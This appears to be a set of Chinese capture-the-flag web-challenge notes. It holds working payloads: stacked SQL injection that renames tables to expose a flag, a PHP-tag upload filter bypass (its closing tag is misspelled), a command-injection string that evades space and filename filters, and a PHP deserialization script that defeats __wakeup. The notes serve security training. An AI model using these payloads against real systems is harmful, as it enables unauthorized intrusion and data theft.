#### sql注入
##### 1、堆叠注入
```
例题: [随便注]
/?inject=1';show databases; --+

/?inject=1';show tables; --+

/*获得两个表名
1919810931114514
words
*/

/?inject=1';show columns from `words`; --+

/*
words里面：id data
1919810931114514里面：flag
*/

推断查询语句(inject=1的输出)：
select id,data from `words` where id='$id'

// 修改表名
rename tables `words` to `haha`;
rename tables `1919810931114514` to `words`;

// 修改字段类型及名称;在change关键字之后，紧跟着的是你要修改的字段名，然后指定新字段名及类型
alter table `words` change `flag` `id` varchar(100);


/?inject=1' or 1 --+
```

#### 文件上传
##### 1、上传文件，发现后台检测了文件内容包含<?，则可以通过一下方法绕过
```javascript
<script language="php">
    //中间写php代码
<srcipt>
```

#### 命令执行
##### 1、在获取所需要的文件时，假如屏蔽了文件名(e.g.flag.php屏蔽了flag)
```
ping 127.0.0.1;a=g;c\a\t$IFS$fla$a.php(同时屏蔽了空格和单引号)
例题:[GXYCTF2019]Ping Ping Ping
```

#### 序列化和反序列化
##### 1、遇到对private的序列化不能直接复制序列化结果
```php
#例题:Web_php_unserialize

<?php
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$a = new Demo('fl4g.php');
$a_1 = serialize($a);
echo $a_1 . "</br>";
$a_1 = str_replace("O:4", "O:+4", $a_1);
echo $a_1 . "</br>";
$a_1 = str_replace("1:", "2:", $a_1);
echo $a_1 . "</br>";
echo base64_encode($a_1)."<br/>";

?> 
```

#### 部分编码
```
正常结尾带着==的是base64编码
url编码：
	%3d	---- =
	%27	---- '
	%5c	---- \
	%20 ---- 空格
```

#### 修改DNS解析记录
```
C:/Windows/System32/drivers/etc/hosts
最后加一条:	ip地址 网站域名
在访问域名的时候优先解析ip地址
```
